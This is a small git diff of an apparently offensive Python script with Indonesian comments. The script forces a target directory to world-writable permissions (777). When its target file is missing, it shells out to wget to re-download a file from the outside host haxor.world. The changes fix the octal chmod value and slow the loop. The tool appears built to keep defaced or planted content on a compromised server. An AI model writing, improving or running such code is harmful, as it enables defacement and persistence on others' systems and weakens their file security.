@@ -20,8 +20,8 @@ def main():
             # Memeriksa apakah direktori dapat ditulis
             if not os.access(target_dir, os.W_OK):
                 print("[!] Directory not writable. Changing permissions.")
-                os.chmod(target_dir, 777)
-                print("[*] Directory permissions changed to 777.")
+                os.chmod(target_dir, 0O777)
+                print("[*] Directory permissions changed to 0O777.")
         else:
             print("[!] Directory not found")
             print("[!] Creating directory")
@@ -43,6 +43,6 @@ def main():
             print("[!] Creating file")
             os.system(f'wget -O {target_file} https://haxor.world/love.txt')
 
-        time.sleep(1)
+        time.sleep(5)
 
 main()
